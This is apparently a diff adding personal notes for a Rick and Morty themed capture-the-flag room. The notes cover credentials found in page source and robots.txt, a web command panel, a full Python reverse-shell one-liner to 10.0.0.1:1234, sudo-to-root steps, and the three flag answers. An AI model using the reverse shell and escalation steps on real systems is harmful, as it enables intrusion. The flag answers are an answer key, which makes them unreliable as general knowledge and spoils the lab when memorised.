@@ -1,0 +1,50 @@
+
+port 22 and 80
+
+in ip ---> viewed page source: Username: R1ckRul3s
+
+in ip/robots.txt ---> Wubbalubbadubdub
+
+Logged in ip/login.php --> username: R1ckRul3s
+			   password: Wubbalubbadubdub
+
+
+AFter loggin in we get a bar to write on and execute...
+
+ls ---> gave the output of all the files...
+
+like that all linux commnds can be run
+
+I used : grep -R . ---> to list everything within every folder recursively
+
+Then i went to view source, I found
+
+
+---> Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
+
+I kept on doing base64:
+
+echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | baset64 -d ...
+
+Until I got a good result --> rabbit hole
+
+I again saw in portal.php portion ---> that which commands can not be run. Keeping that in mind...
+
+I used python rev shell:
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+Got a shell ----> sudo -l ----> (ALL) NOPASSWD: ALL
+
+---> sudo -u root ls /root ----> 3rd.txt
+
+---> sudo -u root cat /root/3rd.txt ----> 3rd ingredients: fleeb juice
+
+--------------------------------
+
+1st ingredient ---> mr. meeseek hair 
+
+2nd ingredient ---> 1 jerry tear
+
+3rd imgredient ---> fleeb juice
